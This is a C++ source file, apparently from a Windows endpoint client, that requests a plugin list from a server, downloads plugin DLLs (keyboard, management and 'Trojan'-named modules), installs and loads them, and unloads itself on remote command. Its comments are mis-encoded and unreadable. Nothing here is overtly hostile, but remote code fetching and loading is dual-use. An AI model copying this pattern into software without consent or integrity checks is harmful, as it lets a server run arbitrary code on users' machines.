/**
* Copyright(C)2013,RUN  All rights reserved.
* @file
* @brief �������ʵ�ֲ���
* @author ����ΰ chengwei@run.com
* @date 2013-07-31
* @version 1.0
* @note 
*************************************************************************/

#include "ddc_util.h"
#include "algorithm"

#include <iphlpapi.h>
#include <ntddndis.h>
#pragma comment(lib,"IPHLPAPI.lib")

#include "PluginServer.h"
#include "../ClientSocket.h"
#include "Log.h"
#include "MD5.h"
#include "crc32.h"

/// ��Ҫ�ƶ�������Ŀ¼�£��ж�Ŀ¼�Ƿ����
static bool dir_exists(const char *dir)
{
	if( strlen(dir)==2 && dir[1]==':')
		return true;

	DWORD dwAttr = GetFileAttributes(dir );
	if( dwAttr == -1 )
		return false;
	return (dwAttr&FILE_ATTRIBUTE_DIRECTORY)!=0;	
}

/// ��Ҫ�ƶ�������Ŀ¼�£��ݹ鴴��Ŀ¼
static int RecurseCreateDirectory(const char *dir)
{	
	if( dir[0] == 0 )
		return DDCE_ARGUMENT_ERROR;

	DDC_BOOL_RETURN( dir_exists(dir),DDCE_SUCCESS );		

	char dirFather[MAX_PATH*2];
	strncpy(dirFather,dir,MAX_PATH*2);
	char *p = strrchr(dirFather,DDC_C_SLASH);
	if( p )
		*p = 0;

	while( !dir_exists(dirFather) )
	{		
		int ret = RecurseCreateDirectory(dirFather);
		if( ret != 0 )
			return ret;
	}

	//Ŀ¼��β����"\\"
	if( dir[strlen(dir)-1] != DDC_C_SLASH )	
		return CreateDirectory(dir,NULL)==TRUE?0:DDCE_DISK_OP_ERROR;

	return 0;
}

/// ��Ҫ�ƶ�������Ŀ¼�������ļ���û��Ŀ¼�ʹ���Ŀ¼
static int ComfirmCopyFile(const char *src,const char *desc)
{
	char szDir[MAX_PATH] = {0};
	strncpy(szDir,desc,MAX_PATH);
	char *p = strrchr(szDir,'\\');
	if(p)
		*(p+1) = 0;
	RecurseCreateDirectory(szDir);

	return ::CopyFile(src,desc,FALSE)?0:DDCE_DISK_OP_ERROR;

}


// ȡ���õĻ�����ʶ��,until.cpp��
extern LPSTR GetTSPMachineID(LPSTR szCPUID);

///////////////////////////////////////////////////////////
// ��ʼ��singleton
#ifdef _MSC_VER
CPlugServer* SingletonHolder<CPlugServer>::pInstance_ = 0;
#endif

CPlugServer::CPlugServer( CClientSocket *_sock)
{
	m_sock = _sock;
	m_err = 0;

	//�õ���װ·��
	GetModuleFileName(NULL,m_szModulePath,TSP_PLUGIN_PATH);
	DDC_RIGHT_SLASH(m_szModulePath);
	
	//���Ŀ¼��ʼ��
	m_szPluginConfigPath.assign(m_szModulePath);
	m_szPluginConfigPath += TSP_PLUGIN_S_CONFIG_PATH;

	//�������Ŀ¼��ʼ��
	// update path to temp by menglz
	
	//m_szPluginDownLoadPath.assign(m_szModulePath);


	char chTempPath[MAX_PATH+1] = {0};

	GetTempPathA(MAX_PATH,chTempPath);

	m_szPluginDownLoadPath.assign(chTempPath);

	m_szPluginDownLoadPath += TSP_PLUGIN_S_DOWNLOAD_PATH;

	//��ȡĿ¼��ʼ��
	//std::string str(m_szModulePath);
	//str += TSP_PLUGIN_S_MQ_PATH;
	
	std::string str(m_szModulePath,1);

	str += TSP_PLUGIN_S_MQ_PATH;  // modify by menglz

	::CreateDirectory(str.c_str(),NULL);
	strncpy(m_plugParam.imp.chResultPath,str.c_str(),MAX_PATH);

	//����ID��ʼ��
	char szCPUID[TSP_PLUGIN_SHORT_PATH];
	GetTSPMachineID(szCPUID);
	m_plugParam.dwMachineID = crc32((uchar*)szCPUID,strlen(szCPUID));

	// ��ʼ������б�,˳������
	m_PluginList.push_back(new CKeyBoardPlug);
	m_PluginList.push_back(new CManagePlug);
	m_PluginList.push_back(new CTrojanPlug);
	
	
	// ���һ��
	for( vector<CPlugServerInfo *>::const_iterator iter=m_PluginList.begin();iter!=m_PluginList.end();++iter )
		if( NULL == (*iter) )
		{
			LOG((LEVEL_ERROR,"Memory Alloc Error.\n"));
			//���캯���У�û�������������ϻ����
		}
	

	// ����Ĭ������
	int ret = ReloadPlugin(0);
	if( 0 != ret )
	{
		LOG((LEVEL_WARNNING,"Plugin Init Failed.\n"));
	}

	
}

CPlugServer::~CPlugServer()
{
	LOG((LEVEL_FUNC_IN_OUT,"CPlugServer::~CPlugServer \n"));

	// ֹͣ���в��
	StatusAll(CPlugServerInfo::STATUS_UNLOAD);

	// ɾ������б�
	std::vector<CPlugServerInfo *>::const_iterator iter=m_PluginList.begin();
	for( ;iter!=m_PluginList.end();++iter )	
		delete (*iter);
	
	m_PluginList.clear();
}


BOOL CPlugServer::StartSrv()
{
	LOG((LEVEL_FUNC_IN_OUT,"CPlugServer::StartService \n"));
	int ret;
	m_err = 0;
	if( !m_sock )
	{
		LOG((LEVEL_ERROR,"û�г�ʼ��socket \n"));
		return FALSE;
	}

	// ��һ����������Ҫ,�������첽�ģ��ļ���������װ
	if( !DownloadConfig(NULL) )
	{
		LOG((LEVEL_ERROR,"����config�ļ�ʧ�� \n"));

		//����Ĭ�ϲ��		
		ret = StatusAll(CPlugServerInfo::STATUS_RUNNING);
		if( 0 != ret )
			LOG((LEVEL_WARNNING,"���ò��ʧ��,ret=%d(%x).\n",ret,ret));
		
		return FALSE;
	}

	//�����������첽�ģ��ȴ����ؽ���
	ret = m_hEvent.wait( CPlugServer::WAIT_TIME );
	
	
	//�жϳ�ʱ������������ԭ��
	if( m_err || ret == DDCE_TIMEOUT )
	{
		LOG((LEVEL_INFO,"���������ļ�ʧ�ܻ��߳�ʱ��������ǰ������. \n"));

		//����Ĭ�ϲ��		
		ret = StatusAll(CPlugServerInfo::STATUS_RUNNING);
		if( 0 != ret )
			LOG((LEVEL_WARNNING,"���ò��ʧ��,ret=%d(%x).\n",ret,ret));
		
		return FALSE;
	}

	return TRUE;
}



//������������ļ������ز�װ��
BOOL CPlugServer::ProcessConfig()
{
	LOG((LEVEL_FUNC_IN_OUT,"CPlugServer::ProcessConfig\n"));

	char md5[33] = {0};
	BOOL bRet = FALSE;
	int ret;

	// ��װ���غ�Ĳ�������ļ���
	std::string strPluginDownLoadFile(m_szPluginDownLoadPath);
	strPluginDownLoadFile += TSP_PLUGIN_S_CONFIG_DLNAME;
	
	// ��װ��������ļ��ļ���
	std::string strPluginConfigFile(m_szPluginConfigPath);
	strPluginConfigFile += TSP_PLUGIN_S_CONFIG_NAME;

	std::string strPluginDownLoadTmpFile;

	// ��ס���������������IO���첽�����������Ҫͬ��
	nm_ddc::CLockGuard<nm_ddc::CThreadMutex> guard(&m_lock);	

	// ��ȡ������Ϣ����ʱ������
	std::list<CPlugServerInfo> l;
	if( !ReadPluginIniFile<CPlugServerInfo>(l,strPluginDownLoadFile,true) )	
	{
		LOG((LEVEL_WARNNING,"������������ļ�ʧ��.%s\n",strPluginDownLoadFile.c_str()));
		return FALSE;
	}

	// �������б�
	for( std::list<CPlugServerInfo>::iterator iter=l.begin();iter!=l.end();++iter )
	{
		// ֻ�����Լ��ܴ����
		int nIndex = PidToIndex(iter->m_pid);
		if( nIndex == -1 )
			continue;

		if( m_PluginList[nIndex]->GetStatus() == CPlugServerInfo::STATUS_DELETE ||
			 m_PluginList[nIndex]->GetStatus() == CPlugServerInfo::STATUS_ERROR )
		{
			// �쳣״̬����Ҫ��������
		}
		else	  
		{
			// �ҵ�����һ�����Ҽ�⣬��ֹ�����ļ���ʵ���ļ���һ�µ��²�����
			bRet = MD5_Caculate_File ( m_PluginList[nIndex]->m_strFullName.c_str(),md5);

			// �Ƚ�md5ֵ���ļ�·��,�������ƶ�λ�������ˣ�̫���ӣ�ֱ��������ɾ������
			//if( bRet && strncmp(iter->m_md5,m_PluginList[nIndex]->m_md5,32) == 0 && m_PluginList[nIndex]->m_strFullName == iter->m_strFullName )
			//update by menglz 20131209
			if( bRet && strncmp(iter->m_md5,md5,32) == 0 && m_PluginList[nIndex]->m_strFullName == iter->m_strFullName )
			{
				// ������б��б����и�λ�ã����Գ�ʼ״̬��ΪINIT�������������1.�����ļ�û�У�2.�����ļ��У����ڵڶ��֣����ڱȽ����ļ�����
				// �϶������ݣ���������ΪUNLOAD״̬�������ܼ���
				if( m_PluginList[nIndex]->GetStatus() == CPlugServerInfo::STATUS_INIT )
				{
					m_PluginList[nIndex]->Status(CPlugServerInfo::STATUS_UNLOAD);
					m_PluginList[nIndex]->LoadPlug(0);
				}				
				continue;
			}
		}
		

		// ׼������
		iter->m_status = CPlugServerInfo::STATUS_WAITDOWNLOAD;
	}	

	// ����
	for_each( l.begin(),l.end(),bind2nd(mem_fun_ref(&CPlugServerInfo::DownloadPlug),m_szPluginDownLoadPath) );

	std::list<CPlugServerInfo>::iterator iter;

	// ��������������ļ�¼
	for( iter=l.begin();iter!=l.end();++iter )
	{
		if( iter->m_status == CPlugServerInfo::STATUS_DOWNLOAD )
		{
			int nIndex = PidToIndex(iter->m_pid);
			if( nIndex == -1 )
			{
				LOG((LEVEL_WARNNING,"���سɹ���PIDδ�ҵ�����:%d\n",iter->m_pid));
				continue;
			}
			
			// ��װ�����ļ���
			strPluginDownLoadTmpFile.assign(m_szPluginDownLoadPath);
			strPluginDownLoadTmpFile += iter->m_strName;

			//�ȼ������վ
			m_recycle.Push(strPluginDownLoadTmpFile);
			
				
			// ������ľ���������ı�·����Ҫ�ı���������
			if( nIndex == PLUG_ARRAY_NO_MANAGE )
			{
				// ж��TSPDll
				ret = m_PluginList[nIndex]->UnLoadPlug(0);
				if( ret != 0 )
				{
					LOG((LEVEL_WARNNING,"������� %s ����:%d(%x)\n",iter->m_strName.c_str(),ret,ret));
				}
			}
			
			// ͣ�ã�ɾ��
			ret = m_PluginList[nIndex]->RemovePlug(0);			 
			if( ret != 0 )
			{
				LOG((LEVEL_WARNNING,"ж�ز�� %s ����:%d(%x)\n",iter->m_strName.c_str(),ret,ret));
			}
						
			//������ļ�������Ŀ�ĵ�
			ret = ComfirmCopyFile(strPluginDownLoadTmpFile.c_str(),iter->m_strFullName.c_str());					
			if( ret != 0 )
			{
				LOG((LEVEL_ERROR,"�����ļ�����:(%s==>%s),Lasterror=%d\n",strPluginDownLoadTmpFile.c_str(),iter->m_strFullName.c_str(),GetLastError()));
			}

			// ·����ͬ��������ľ����߼��̲����ɾ����
			if( m_PluginList[nIndex]->m_strFullName == iter->m_strFullName &&
				(nIndex == PLUG_ARRAY_NO_KEYBOARD || nIndex == PLUG_ARRAY_NO_TROJAN ) )
			{
				// �����ֻ�����������Update()����,Update�����´��������������MoveFileEx,�ȴ���������
				ret = m_PluginList[nIndex]->UpdatePlug(0,strPluginDownLoadTmpFile,&m_plugParam);
				if( ret != 0 )
				{
					LOG((LEVEL_WARNNING,"������� %s ����:%d(%x)\n",iter->m_strName.c_str(),ret,ret));
				}
			}

			// ���������ļ���Ŀ�ĵ�
			m_PluginList[nIndex]->UpdatePlug(CPlugServerInfo::UPDATE_CFG,iter->m_strFullName,&m_plugParam);
			
			iter->m_strURL = "";

			// ��ֵ������״̬			
			*m_PluginList[nIndex] = *iter;
			m_PluginList[nIndex]->m_status = CPlugServerInfo::STATUS_UNLOAD;
		}
	}


	// ����������д����ini�ļ�
	if( !WritePluginIniFile(l,strPluginConfigFile,true) )
	{
		LOG((LEVEL_ERROR,"д�����ļ���:%s",strPluginConfigFile.c_str()));
	}
	
	// ������̲��ͣ��
	if( find(l.begin(),l.end(),m_PluginList[PLUG_ARRAY_NO_KEYBOARD]->m_strName.c_str() ) == l.end() )
		m_PluginList[PLUG_ARRAY_NO_KEYBOARD]->RemovePlug(0);

	// ���TSPPlug״̬Ϊ��ʼ������ΪUnload,�����б����д���
	if( m_PluginList[PLUG_ARRAY_NO_MANAGE]->GetStatus() == CPlugServerInfo::STATUS_INIT &&
		 m_PluginList[PLUG_ARRAY_NO_MANAGE]->m_strFullName != "" )
		m_PluginList[PLUG_ARRAY_NO_MANAGE]->Status(CPlugServerInfo::STATUS_UNLOAD );

	// ����
	StatusAll(CPlugServerInfo::STATUS_RUNNING);	

	if( find(l.begin(),l.end(),m_PluginList[PLUG_ARRAY_NO_MANAGE]->m_strName.c_str() ) == l.end() )
	{
		// ��������ͣ�ã�ɾ��һ���Ӳ��
		LOG((LEVEL_INFO,"������ͣ�ã�ɾ���Ӳ��\n"));
		ret = m_PluginList[PLUG_ARRAY_NO_MANAGE]->RemovePlug(CPlugServerInfo::UPDATE_DLL);
		if( ret != 0 )
			LOG((LEVEL_ERROR,"TSPPlug ����ʧ��.\n"));		

		// ж������
		ret = m_PluginList[PLUG_ARRAY_NO_MANAGE]->RemovePlug(0);
		if( ret != 0 )
			LOG((LEVEL_ERROR,"TSPPlug ����ʧ��.\n"));		
	}
	else
	{
		// ֪ͨTSPPlugȥ����
		LOG((LEVEL_INFO,"֪ͨManager�������:%s\n",strPluginDownLoadFile.c_str()));
		ret = m_PluginList[PLUG_ARRAY_NO_MANAGE]->UpdatePlug(CPlugServerInfo::UPDATE_DLL,strPluginDownLoadFile,&m_plugParam);
		if( ret != 0 )
			LOG((LEVEL_ERROR,"TSPPlug ����ʧ��.\n"));		
	}
	

	// list��Ҫ�������ĸ�״̬
	for_each(l.begin(),l.end(),bind2nd(mem_fun_ref(&CPlugServerInfo::Status),CPlugServerInfo::STATUS_INIT));	

	// �����ֳ�
	m_recycle.PopAll();

	return TRUE;
}

// �����ļ�����,�������첽�ģ�����ֻ�Ƿ��͸���������
BOOL CPlugServer::DownloadConfig(const TCHAR *szSaveName)
{
	LOG((LEVEL_FUNC_IN_OUT,"CPlugServer::DownloadConfig\n"));

	//���Ͳ����������
	BYTE bToken = TOKEN_PLUGIN_REQUEST;

	char szCPUID[TSP_PLUGIN_SHORT_PATH];
	GetTSPMachineID(szCPUID);
	
	CBuffer buff;
	buff.Write(&bToken,sizeof(BYTE));
	if( !buff.Write( (LPBYTE)szCPUID,50) )
	{
		LOG((LEVEL_ERROR,"buff��д����ʧ��\n"));
		return FALSE;
	}
	

	
	//Sleep(1000);  //by menglz

	m_sock->Send(buff.GetBuffer(),buff.GetBufferLen());
	

	return TRUE;
}

// ��������������
int CPlugServer::OnPluginRequest(void *lpBuffer,uint nBufLen)
{		
	//����Ŀ¼
	DWORD dwAttr = GetFileAttributes(m_szPluginDownLoadPath.c_str() );
	if( dwAttr == -1 || (dwAttr&FILE_ATTRIBUTE_DIRECTORY) == 0 )
		if( !CreateDirectory(m_szPluginDownLoadPath.c_str(),NULL) )
		{ LOG((LEVEL_WARNNING,"����Ŀ¼ʧ��:%s ������:%d(%x).\n",m_szPluginDownLoadPath.c_str(),GetLastError(),GetLastError())); }
		else
			m_recycle.Push(m_szPluginDownLoadPath,CTspRecycle::FLAG_DIR);		//Ŀ¼���������վ



	// ��װ���ص������ļ���
	std::string strPluginDownloadFile(m_szPluginDownLoadPath);
	strPluginDownloadFile += TSP_PLUGIN_S_CONFIG_DLNAME;
	/*
	// д���ļ�
	std::ofstream ofile;
	ofile.open(strPluginDownloadFile.c_str(),ios::trunc|ios::out|ios::binary);
	if( !ofile )
	{
		LOG((LEVEL_ERROR,"���ļ�ʧ��:%s.\n",strPluginDownloadFile.c_str()));
		m_err = DDCE_OPEN_FILE_ERROR;
		RETURN( DDCE_OPEN_FILE_ERROR );
	}
	else
		m_recycle.Push(strPluginDownloadFile);		//�������վ

	ofile.write( (const char *)lpBuffer,nBufLen);
	ofile.close();
	*/


	FILE *fp = fopen(strPluginDownloadFile.c_str(),"wb");
	if( !fp )
	{
		LOG((LEVEL_ERROR,"���ļ�ʧ��:%s.\n",strPluginDownloadFile.c_str()));
		m_err = DDCE_OPEN_FILE_ERROR;
		RETURN( DDCE_OPEN_FILE_ERROR );
	}
	else
		m_recycle.Push(strPluginDownloadFile);		//�������վ

	if (0  == (IsBadReadPtr(lpBuffer,nBufLen)))  //zhenyu 20140916 ��ָֹ�뱻��
	{
		fwrite( lpBuffer,nBufLen,1,fp);
	}
	
	fclose(fp);

	//ִ֪ͨ���̼߳���
	m_err = 0;
	m_hEvent.signal();
	
	return 0;
}

// ������ж������
int CPlugServer::OnPluginRemove(void *lpBuffer,uint nBufLen)
{
	// ֪ͨTSPPlugж�ز��
	m_PluginList[PLUG_ARRAY_NO_MANAGE]->RemovePlug(1);

	//��Ҫ�ظ�һ��Ӧ��������������������Ϊж�ص���
	BYTE bToken = TOKEN_REPLY_REMOVE;			
	m_sock->Send((LPBYTE)&bToken, sizeof(bToken));
	

	// �ȴ�TSPPlugж��
	Sleep(1000);

	// ж���Լ���ģ��
	std::vector<CPlugServerInfo *>::const_iterator iter=m_PluginList.begin();
	for( ;iter!=m_PluginList.end();++iter )	
		(*iter)->RemovePlug(0);

	return 0;
}


// �������ļ��������ɲ���б�
int CPlugServer::ReloadPlugin(DWORD dwFlag)
{
	LOG((LEVEL_FUNC_IN_OUT,"CPlugServer::ReloadPlugin,flag = %d\n",dwFlag));	
	
	// ���´������ļ���
	std::string strPluginConfigFile(m_szPluginConfigPath);
	strPluginConfigFile += TSP_PLUGIN_S_CONFIG_NAME;
	
	std::list<CPlugServerInfo> l;
	// ��������ļ�����ȷ����������ģ��ܿ��ܵ��ô˺��������Բ����ش���������ͨ���������µ��µ�
	if( !ReadPluginIniFile<CPlugServerInfo>(l,strPluginConfigFile,true) )
	{
		LOG((LEVEL_ERROR,"��ȡ��������ļ���"));
		return DDCE_READ_FILE_ERROR;
	}
	
	// ֻ�����Լ��ܴ����3�ֲ�����������ó�ʼ״̬
	for( std::list<CPlugServerInfo>::const_iterator iter=l.begin();iter!=l.end();++iter )
	{
		if( iter->m_pid == TSP_PLUGIN_REMOVE_PID )
			*m_PluginList[PLUG_ARRAY_NO_TROJAN] = *iter;
		else if( iter->m_pid == TSP_PLUGIN_MANAGE )
			*m_PluginList[PLUG_ARRAY_NO_MANAGE] = *iter;
		else if( iter->m_pid == TSP_PLUGIN_KEYBOARD )
			*m_PluginList[PLUG_ARRAY_NO_KEYBOARD] = *iter;		
	}
	
	// ���ó�ʼ״̬
	for_each(m_PluginList.begin(),m_PluginList.end(),bind2nd(mem_fun(&CPlugServerInfo::Status),CPlugServerInfo::STATUS_INIT));

	return 0;
}

//�ı���״̬
int CPlugServer::Status(int pid,int flag)
{
	int ret;

	// ��������
	std::vector<CPlugServerInfo *>::iterator iter=m_PluginList.begin();
	for( ;iter!=m_PluginList.end();++iter )	
		if( (*iter)->m_pid == pid )
		{
			if( flag == CPlugServerInfo::STATUS_RUNNING )
				ret = (*iter)->StartPlug(&m_plugParam);
			else if( flag == CPlugServerInfo::STATUS_UNLOAD )
				ret = (*iter)->UnLoadPlug(0);					
			else if( flag == CPlugServerInfo::STATUS_LOAD )
				ret = (*iter)->LoadPlug(0);					
			else if( flag == CPlugServerInfo::STATUS_STOP )
				ret = (*iter)->StopPlug(0);					
			else if( flag == CPlugServerInfo::STATUS_DELETE )
				ret = (*iter)->RemovePlug(0);	
			return ret;
		}
	
	LOG((LEVEL_WARNNING,"�������δ�ҵ�:%d\n",pid));
	return CPlugServerInfo::STATUS_ERROR;	
}

//��ò��״̬
int CPlugServer::Status(int pid)
{
	// ��������
	std::vector<CPlugServerInfo *>::const_iterator iter=m_PluginList.begin();
	for( ;iter!=m_PluginList.end();++iter )	
		if( (*iter)->m_pid == pid )
			return (*iter)->m_status;
	
	LOG((LEVEL_WARNNING,"�������δ�ҵ�:%d\n",pid));
	return CPlugServerInfo::STATUS_ERROR;
}

//�ı����в��״̬
int CPlugServer::StatusAll(int flag)
{
	if( flag == CPlugServerInfo::STATUS_RUNNING )
		for_each(m_PluginList.begin(),m_PluginList.end(),bind2nd(mem_fun(&CPlugServerInfo::StartPlug),&m_plugParam));	
	else if( flag == CPlugServerInfo::STATUS_UNLOAD )
		for_each(m_PluginList.begin(),m_PluginList.end(),bind2nd(mem_fun(&CPlugServerInfo::UnLoadPlug),0));
	else if( flag == CPlugServerInfo::STATUS_LOAD )
		for_each(m_PluginList.begin(),m_PluginList.end(),bind2nd(mem_fun(&CPlugServerInfo::LoadPlug),0));
	else if( flag == CPlugServerInfo::STATUS_STOP )
		for_each(m_PluginList.begin(),m_PluginList.end(),bind2nd(mem_fun(&CPlugServerInfo::StopPlug),0));
	else if( flag == CPlugServerInfo::STATUS_DELETE )
		for_each(m_PluginList.begin(),m_PluginList.end(),bind2nd(mem_fun(&CPlugServerInfo::RemovePlug),0));
	else
	{
		  LOG((LEVEL_WARNNING,"���״̬δ�ҵ�:%d\n",flag));
	}
	
	return 0;
}

// תpid����Ӧ����������
int CPlugServer::PidToIndex(int pid)
{
	// �����ų�ʼ��ʱ�̶��������ܶ����ο����캯��
	if( pid == TSP_PLUGIN_REMOVE_PID )
		return PLUG_ARRAY_NO_TROJAN;
	else if( pid == TSP_PLUGIN_MANAGE )
		return PLUG_ARRAY_NO_MANAGE;
	else if( pid == TSP_PLUGIN_KEYBOARD )
		return PLUG_ARRAY_NO_KEYBOARD;
	return -1;
}

